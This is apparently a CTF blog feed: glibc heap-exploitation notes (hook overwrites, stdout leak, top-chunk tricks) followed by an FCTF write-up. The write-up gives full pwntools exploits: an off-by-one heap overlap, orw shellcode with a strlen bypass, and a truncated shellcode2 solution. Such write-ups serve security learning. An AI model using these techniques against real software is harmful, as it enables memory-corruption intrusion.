title="0x3mmap所分配chunk"></a>0x3mmap所分配chunk</h2><p>当申请chunk大小大于或接近top_chunk时,会创建mmap段并在mmap段中分配</p><p>分配的chunk的实际地址就是该mmap段的开始地址</p><p>且mmap段与libc.so段之间的偏移是固定的</p><p>在不能泄露libc的情况下可以用其相对偏移得到libc地址</p><h2 id="0x4双hook配合"><a href="#0x4双hook配合" class="headerlink" title="0x4双hook配合"></a>0x4双hook配合</h2><p>大多数时候,malloc_hook和realloc_hook(二者地址相邻)的fastbinchunk伪造都能寻找到合适的fakechunk,但free_hook则更难找到</p><p>当one_gadget直接使用都不能满足条件时,则要先跳转到realloc进行栈帧调整(调整多少,可以通过跳转偏移来控制),之后调用realloc_hook执行onegadget</p><h2 id="0x5-fini-array"><a href="#0x5-fini-array" class="headerlink" title="0x5.fini_array"></a>0x5.fini_array</h2><p>程序正常退出时会由_dl_fini(_dl_fini+823左右)调用<code>.fini_array</code>地址处的函数，<strong>不过只能利用一次</strong>。只能利用一次是因为栈上的环境等肯定变化了，返回地址等自然也变化了</p><p>在没开pie的情况下利用还是很简单的</p><h2 id="0x6调试细节"><a href="#0x6调试细节" class="headerlink" title="0x6调试细节"></a>0x6调试细节</h2><p>一直以来都被这个调试搞得很烦,gdb常常不在exp中我所需要的地方开始,偶尔还不能加载符号表…</p><p>苦于找不到相关的资料,只能之际摸索,总算找到解决方案了</p><h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p><strong>程序由gdb运行和pwntools运行这两种方式,唤起的程序的环境有些许不同</strong></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>先说有时候无法加载符号表,导致无法正常调试</p><p>多次实验后发现起因是—exp一路打通了shell所导致</p><p><strong>解决方案:</strong>在p.interactive()函数前使用命令<strong>sleep(1)或pause()</strong>使得程序停下来</p><p>这样便能加载符号表了</p><h3 id="合适的调试起始位置"><a href="#合适的调试起始位置" class="headerlink" title="合适的调试起始位置"></a>合适的调试起始位置</h3><p>经常attach上去发现不是自己想要的位置,导致调试困难</p><p><strong>解决方案:</strong>在gdb.attach()下方使用命令<strong>sleep(1)或pause()</strong>使得程序停下来,然后再<strong>配合backtrace</strong>找到合适的断点,进入正确的流程便可,(有时会被read卡住,需要再发送点东西)</p><p>需要注意如果没找到合适的断点的话,可能会出现一些奇怪的错误</p><p><strong>注意:</strong>gdb后组合pause可能会致使发生一些原本不存在的牛马问题</p><h3 id="另一种调试方式"><a href="#另一种调试方式" class="headerlink" title="另一种调试方式"></a>另一种调试方式</h3><p>由于pwntools中gdb常用是attach附加到一个进程上,所以完全可以,早早打开gdb,然后在命令行中输入交互指令并发送,然后在gdb中逐步向下运行到需要调试的地方,(有时会被read卡住,需要再发送点东西)</p><h2 id="0x7main-arena偏移的获取"><a href="#0x7main-arena偏移的获取" class="headerlink" title="0x7main_arena偏移的获取"></a>0x7main_arena偏移的获取</h2><p>因为不能直接搜索符号main_arena,所以只能间接获得</p><p><code>main_arena_offset = libc.symbols[&#39;__malloc_hook&#39;] + 0x10</code></p><p>即main_arena在__malloc_hook向后0x10处</p><h2 id="0x8calloc分配的chunk"><a href="#0x8calloc分配的chunk" class="headerlink" title="0x8calloc分配的chunk"></a>0x8calloc分配的chunk</h2><p><code>malloc</code>分配的内存块的内容是不确定的，它可能包含之前被使用的数据残留。而<code>calloc</code>函数分配的内存块在分配时会被初始化为零，也就是说，每个字节都被设置为\0。</p><p>若存在tcache,calloc分配chunk不通过TCACHE,但依然会触发剩余chunk进入tcache</p><h2 id="0x9-maloc-hook附近的fake-chunk"><a href="#0x9-maloc-hook附近的fake-chunk" class="headerlink" title="0x9 __maloc_hook附近的fake_chunk"></a>0x9 __maloc_hook附近的fake_chunk</h2><p>一般情况下找到的能够控制到__maloc_hook的fake_chunk的大小都是<strong>0x7f</strong>,在main_arena前附近</p><h2 id="0xa-PIE的一种应对方式"><a href="#0xa-PIE的一种应对方式" class="headerlink" title="0xa PIE的一种应对方式"></a>0xa PIE的一种应对方式</h2><p>当开启pie后,利用方式与不开启有明显差异,一种比较常见的应对方式是<strong>尾地址部分改写</strong></p><p><strong>利用后12位不变性以及页对齐带来的堆地址结尾可观测性</strong></p><p>通过只改写部分数据来达到错位访问所需内存的目的</p><p>在堆中因为要出现堆地址,所以一般要先释放两个大小相同chunk,以达到通过fd获取某个chunk的地址,之后再部分写</p><h2 id="0xb-unsortedbin-chunk处理"><a href="#0xb-unsortedbin-chunk处理" class="headerlink" title="0xb unsortedbin-chunk处理"></a>0xb unsortedbin-chunk处理</h2><p>unsortedbin 是FIFO,头插尾取,寻找chunk主要利用bk指针</p><p>进入unsortedbin的chunk如果<strong>相邻会<u>立即合并</u></strong></p><p>并修改其后一个非freechunk的prev_size字段</p><p>unsortedbin中切割chunk时,分配出的chunk是前半部分,依然存在unsorted中的remainer则是后半部分,其实其他chunk切割也是这样</p><h2 id="0xc-prev-size字段何时变化"><a href="#0xc-prev-size字段何时变化" class="headerlink" title="0xc prev_size字段何时变化"></a>0xc prev_size字段何时变化</h2><p>prev_size字段只在上一个chunk为free状态时起作用</p><p>prev_size字段主要被修改在两种情况:</p><ol><li>合并chunk</li><li>分割chunk</li></ol><p><strong>第一种情况:</strong></p><p>合并chunk时修改其下一个chunk的prev_size字段</p><p><strong>第二种情况:</strong></p><p>修改剩余部分的下一个chunk的prev_size,其实依然是分割前的下一个chunk的prev_size,其不会修改剩余部分chunk的prev_size字段,因为前半部分处于使用状态显然不会去修改他</p><h2 id="0xd-io-overflow相关"><a href="#0xd-io-overflow相关" class="headerlink" title="0xd io_overflow相关"></a>0xd io_overflow相关</h2><p> <code>puts</code>等函数，会最终调用到 <code>_IO_new_file_overflow</code></p><p>而该函数会最终使用 <code>_IO_do_write</code> 进行真正的输出。</p><p>在输出时，如果具有缓冲区，会输出 <code>_IO_write_base</code> 开始的缓冲区内容，直到 <code>_IO_write_ptr</code> （也就是将 <code>_IO_write_base</code> 一直到 <code>_IO_write_ptr</code> 部分的值当做缓冲区</p><p>在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中）</p><p>但是在 <code>setbuf</code> 后，理论上会不使用缓冲区。然而如果能够修改 <code>_IO_2_1_stdout_</code> 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 <code>_IO_write_base</code> 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。</p><p>_IO_2_1_stdout与main_arena相距较近,部分写获得该区域作为chunk</p><p>flag满足条件后(<strong>flag==0xfbad1800</strong>)</p><p>当 <code>_IO_write_base</code>与<code>_IO_write_ptr</code>不相等时调用puts等时立即输出从_IO_write_base开始的内容</p><h2 id="0xe-chunk合并检测"><a href="#0xe-chunk合并检测" class="headerlink" title="0xe chunk合并检测"></a>0xe chunk合并检测</h2><p>释放chunk检测合并时,先检测上一个是否空闲,再检测下一个是否是topchunk,如果不是则检测下一个chunk</p><p>而合并会用到unlink宏,unlink中其中一个检测是检测该chunk的size是否与其下一个chunk的prev_size相等,注意其只是检测相等,并且下一个chunk是通过该chunk+size偏移得到的,一般都是相等的(自己构造的另说)</p><p>这也就是说如果任意修改一个chunk的prev_size字段并触发合并,只要这个chunk-prev_size刚好是一个chunk的起始地址,那么unlink检测就会通过,它不会比较我们修改的prev_size是否等于找到的chunk的size,而是用找到的chunk和利用该chunk的size找到的chunk的prev_size作比较</p><h2 id="0xf-无free时topchunk的利用"><a href="#0xf-无free时topchunk的利用" class="headerlink" title="0xf 无free时topchunk的利用"></a>0xf 无free时topchunk的利用</h2><p>当程序没有free功能时,若能够修改topchunk的size,可以减小topchunk的大小,再申请一个比修改后大小更大的chunk使之加入unsortedbin,这样可以利用unsortedbin去泄露libc</p><p>在申请的堆块大小大于 top chunk的大小时会调用 sysmalloc 来分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    If have mmap, and the request size meets the mmap threshold, and</span><br><span class="line">    the system supports mmap, and there are few enough currently</span><br><span class="line">    allocated mmapped regions, try to directly map this request</span><br><span class="line">    rather than expanding top.</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line"> if (av == NULL</span><br><span class="line">     || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</span><br><span class="line">     &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">   &#123;</span><br><span class="line">     char *mm;           /* return value from mmap call*/</span><br><span class="line"></span><br><span class="line">   try_mmap:</span><br></pre></td></tr></table></figure><p>如果申请大小 &gt; (unsigned long) (mp_.mmap_threshold) 就会直接 mmap 出一块内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  /*</span><br><span class="line">     If not the first time through, we require old_size to be</span><br><span class="line">     at least MINSIZE and to have prev_inuse set.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br><span class="line">............</span><br><span class="line">          if (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</span><br><span class="line">              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free (av, old_top, 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>另一种是会先把原来的 top chunk free 进 unsorted bin。但是要满足几个条件：</p><p>1、(unsigned long) (old_size) &gt;= MINSIZE</p><p>2、 prev_inuse (old_top) = 1</p><p>3、 ((unsigned long) old_end &amp; (pagesize - 1)) == 0)</p><p>所以我们通过溢出把 top chunk 的 size 改小即可，并且注意内存页对齐。</p>]]></content>
    
    
    <summary type="html">实操</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="实操" scheme="https://ixout.github.io/tags/%E5%AE%9E%E6%93%8D/"/>
    
  </entry>
  
  <entry>
    <title>FCTF</title>
    <link href="https://ixout.github.io/posts/21638/"/>
    <id>https://ixout.github.io/posts/21638/</id>
    <published>2023-04-18T08:57:52.000Z</published>
    <updated>2023-05-20T04:18:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Pwn-warmup-1"><a href="#Pwn-warmup-1" class="headerlink" title="Pwn warmup 1"></a>Pwn warmup 1</h2><p>保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/glibc/glibc-2.31/build/lib&#x27;</span><br></pre></td></tr></table></figure><p>附件有给源代码,粗读一遍判定为菜单类堆题</p><p>程序开头会直接给出flag的地址</p><p>考虑如何利用,细读源码发现edit函数存在off-by-one漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">note_t</span> *note = get_note();</span><br><span class="line">  <span class="keyword">if</span> (!note) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(note-&gt;content);  </span><br><span class="line">  printff(<span class="string">&quot;New content: &quot;</span>);</span><br><span class="line">  read_str(note-&gt;content, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strlen函数到\x00结束,如果某个chunk能占用下一个chunk的prev_size则能覆盖下一个chunk的size</p><p>可以用这个漏洞来达到chunk extended and overlapping的目的</p><p>再看add函数,进行add函数时</p><ol><li>首先创建一个chunk用于一个该note信息管理</li><li>再创建一个用户自定义大小的chunk用于存储内容</li></ol><p>这两个chunk是黏在一起的</p><p>于是,我们可以这样利用</p><p>创建3个note</p><ol><li>note0用于触发off-by-one</li><li>note1用于释放重分配以达到chunk extended and overlapping</li><li>note2用于触发show功能读取flag</li></ol><p>具体步骤</p><p>我创建的三个note的content大小都为24且初始填满(1和2填不填无所谓),方便利用</p><ol><li>edit修改note0,使note1的size为一个能够覆盖到note2的content指针的大小</li><li>释放note1</li><li>再add一个note,content大小为能使分配到的chunk为之前释放的note1的content,并填充内容覆盖note2的content指针</li><li>对note2进行show,得到flag</li></ol><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第2个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是我第一次做的思路,这样做的话对note1的content大小没有什么要求</p><p>后面我发现其实只要两个note也能实现得到flag</p><p>不过对note1的content大小有严格要求</p><p>因为如果note1的content实际chunk大小为0x20的话</p><p>再分配note1的时候,note1头的chunk因为大小合适,直接取的之前被释放的note1的content的chunk</p><p>又因为之前的chunk overlapping</p><p>所以note1的content就包含了note1的头,可以直接修改note1的content指针</p><p>再show-note1得到flag</p><p>顺便尝试了下函数写法</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(e))</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 实操调试的一些小细节 </summary>              <div class='content'>              <p>主要还是一些关于stdin的细节，当程序读取n个字节时，可以发送多余n的字节，程序读取完后，剩余的数据依然会被保留在stdin中，相邻的输入函数又会直接读取其中的数据，而这可能并不是我们所期望的，这样如果<strong>没有注意把控字节数</strong>的话，调试的时候可能出一些问题，例如菜单式题目直接从stdin中读取一个数据，读到了非菜单区号数据,那么程序的运行就会受阻;又或者程序读取的数据,并没有包含整个我们需要的数据,又会出现问题</p><p>总之需要注意发送的数据与接收的数据数量对应关系,特别要注意\n符</p>              </div>            </details><h2 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/aichch/pwn/s1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开,程序执行并不复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwrite(<span class="string">&quot;Input your shellcode:\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf) &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sandbox();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  fwrite(<span class="string">&quot;Oops! maybe too long!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过再payload前添加’\x00’绕过strlen的检测,但单独一个<strong>‘\x00’会使得程序流停滞</strong>,故可以让’\x00’和push联合作为一条指令—-push 0h(\x6a00)</p><p>另外程序开启了沙盒,只能使用orw操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./s1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">2225</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)  <span class="comment">#不进行这一步会出错,因为默认是32位</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sh=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sh+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh=asm(sh)</span><br><span class="line">p.send(<span class="string">b&#x27;\x6a\x00&#x27;</span>+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另外提一下,程序进行时stdin,stdout,stderr三个文件流是自行打开的,文件描述符分别是0,1,2</p><p>故之后打开的文件的描述符是从3开始的</p><h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>这题没做出来,汇编忘得差不多了,还是太依赖ida的反汇编了😥</p><p>赛后看大佬的wp才恍然大悟</p><hr><p>这题在于程序一次只能执行四个字节长度的代码,故如果要连接各串代码还需要用到jmp指令,又占去了一半的长度,</p><p>再加上程序还会随机打乱代码顺序</p><p>想直接完成orw几乎不可能</p><p>但可以观察到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000016DA 48 8B 45 F0                   mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000000016DE 48 83 C0 10                   add     rax, 10h</span><br><span class="line">.text:00000000000016E2 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:00000000000016E5 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000016EA FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>程序是通过rdx跳往代码执行处的</p><p>那么第一次只需要向rdx处写命令,并在前面填充一些nop,程序流继续往下执行就会执行新写的命令了</p><p>那么第一次执行的代码因该就要是read(0,rdx,rdx),长度不用指定只要够大就行</p><p>因为syscall要在最后执行,所以只有四分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sc2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2226</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">next_slot = <span class="string">&#x27;;jmp $+30&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_slot</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">return</span> code + next_slot</span><br><span class="line"></span><br><span class="line">preamble = []</span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor edi, edi&#x27;</span>))  <span class="comment">#不能是rdi,汇编代码三个字节</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor eax, 